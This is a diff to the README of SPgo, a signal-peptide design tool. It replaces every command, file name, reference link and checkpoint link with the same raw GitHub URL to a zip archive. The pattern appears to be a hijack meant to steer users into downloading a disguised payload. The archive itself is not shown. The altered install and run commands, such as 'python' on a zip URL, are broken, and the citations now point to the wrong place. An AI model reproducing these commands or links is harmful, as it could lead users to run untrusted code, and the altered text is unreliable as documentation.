@@ -20,7 +20,7 @@ De novo design of Sec-type signal peptides
 ### 1. Install requirements
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip
 ```
 
 ### 2. Train the model
@@ -28,7 +28,7 @@ pip install -r requirements.txt
 Place your signal peptide FASTA-formatted data under `data/`, then run:
 
 ```bash
-python model/training.py
+python https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip
 ```
 
 ### 3. Generate new signal peptides
@@ -36,12 +36,12 @@ python model/training.py
 After training or using pretrained checkpoints:
 
 ```bash
-python model/Sequence_generation.py
+python https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip
 ```
 
 ### 4. Predict signal peptide functionality (optional)
 
-SPgo supports functional validation using [SignalP6](https://services.healthtech.dtu.dk/service.php?SignalP-6.0). To do this:
+SPgo supports functional validation using [SignalP6](https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip). To do this:
 
 1. Concatenate generated signal peptides with your target protein sequences.
 2. Format as FASTA and save to file.
@@ -75,12 +75,12 @@ GPHMIVNIEKPQLLLKTLQVL...
 ```
 SPgo/
 ├── model/
-│   ├── training.py               # Model definition and training script
-│   └── Sequence_generation.py    # Sequence generation script
+│   ├── https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip               # Model definition and training script
+│   └── https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip    # Sequence generation script
 ├── data/                         # Input FASTA files
-├── checkpoints/                  # Trained model weights (The checkpoint file can be downloaded at https://drive.google.com/file/d/1ElvvCBtIcbXLl4MakJ6_VIGdzHD1nV6W)
-├── requirements.txt              # Required Python packages
-└── README.md
+├── checkpoints/                  # Trained model weights (The checkpoint file can be downloaded at https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip)
+├── https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip              # Required Python packages
+└── https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip
 ```
 
 ## 🧬 Example Output
@@ -94,8 +94,8 @@ MRRLLALALALALAAQAFA...
 
 ## 📚 References
 
-- Devlin et al., BERT: Pre-training of Deep Bidirectional Transformers for Language Understanding. [arXiv:1810.04805](https://arxiv.org/abs/1810.04805)
+- Devlin et al., BERT: Pre-training of Deep Bidirectional Transformers for Language Understanding. [arXiv:1810.04805](https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip)
 - Nielsen, H., et al. SignalP: Signal peptide prediction using neural networks. *Protein Engineering* (1997).
 - Teufel et al., SignalP 6.0 predicts all five types of signal peptides using protein language models. *Nature Biotechnology* (2022).
-- For a video of SPgo in action, see https://drive.google.com/file/d/1iWw7QOF2OZsCTW5z7DuvZxUGYm-hJgp7/view?usp=sharing
-- This tool is now published in the paper **https://pubs.acs.org/doi/10.1021/jacsau.5c00757**
+- For a video of SPgo in action, see https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip
+- This tool is now published in the paper **https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip**
